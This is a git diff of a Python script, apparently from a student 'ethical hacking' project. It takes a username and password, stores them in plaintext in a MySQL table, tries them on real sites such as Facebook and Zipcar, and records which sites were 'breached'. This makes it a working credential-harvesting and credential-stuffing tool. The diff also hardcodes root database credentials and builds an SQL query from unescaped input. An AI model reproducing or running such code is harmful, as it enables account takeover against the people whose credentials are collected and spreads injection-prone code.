@@ -1,6 +1,6 @@
 #!/usr/bin/env python
 """
-Jae Lee & Cameron Moeller
+Jae Lee & Cameron Moeller & Morio Ramdenbourg
 sample input line
 
 Usage:
@@ -11,6 +11,16 @@ from enum import Enum
 import sys
 import mechanize
 import json
+import pymysql.cursors
+import pymysql
+
+# Connect to the database
+connection = pymysql.connect(host='localhost',
+                             user='root',
+                             password='ethicalhacking',
+                             db='ethicalhackingteam2',
+                             charset='utf8mb4',
+                             cursorclass=pymysql.cursors.DictCursor)
 
 
 # enum for the sites
@@ -25,7 +35,7 @@ class Site(str, Enum):
 urls = {
     Site.Facebook: {
         "attempt": "http://www.facebook.com/login.php",
-        "correct": "https://www.facebook.com/?sk=welcome"
+        "correct": "https://www.facebook.com/checkpoint/?next"
     },
     Site.Zipcar: {
         "attempt": "https://members.zipcar.com/register/",
@@ -67,19 +77,30 @@ def main():
         username = sys.argv[1]
         password = sys.argv[2]
 
-        results = {}
+                    
+        # Update MySql database
+        with connection.cursor() as cursor:
+            # Create a new record
+            print("<p>Adding entry</p>")
+            sql = "INSERT INTO `ethicalhackingteam2` (`username`, `password`) VALUES (%s, %s)"
+            cursor.execute(sql, (username, password))
+
+        # connection is not autocommit by default. So you must commit to save
+        # your changes.
+        connection.commit()
+
         # Authenticate to each site
         for site in sys.argv[3:]:
-            result = attempt_authentication(site=site, username=username, password=password)
-            results[site] = "true" if result else "false"
-
-        print(json.dumps(results))
+            print("<p><u>Attempt: <strong>" + site + "</strong></u></p>")
+            
+            # Attempt authentication
+            attempt_authentication(site=site, username=username, password=password)
 
     else:
-        # Exit program and print an error
-        error = {"error": "invalid arguments"}
-        print(json.dumps(error))
+        # Exit program; invalid arguments
         print("Usage: python Authenticate.py <username> <password> <site1> <site2> <site3>")
+
+    connection.close()
 
 
 def attempt_authentication(site, username, password):
@@ -111,11 +132,31 @@ def attempt_authentication(site, username, password):
         response = browser.submit()
         response_url = response.geturl()
 
-        # Check if the authentication was successful
-        return response_url == correct
+        print(response_url)
 
-    except Exception as _: # Catch exception and return false
-        return False
+        # Check if the authentication was successful
+        success = response_url == correct
+
+        if success:
+            print("<p style=color:green;>Success</p>")
+            print("<p>Updating database...</p>")
+
+            # Update MySql database
+            with connection.cursor() as cursor:
+                sql = "UPDATE ethicalhackingteam2 SET sites_breached_%s" % site
+                sql = sql + "=1"
+                cursor.execute(sql)
+                print("<p>Updated</p>")
+
+            # # connection is not autocommit by default. So you must commit to save
+            # # your changes.
+            connection.commit()
+            
+        else:
+            print("<p style=color:red;>Failed</p>")       
+
+    except Exception as e: # Catch exception and return false
+        print("An error occured:", e)
 
 if __name__ == '__main__':
     main()
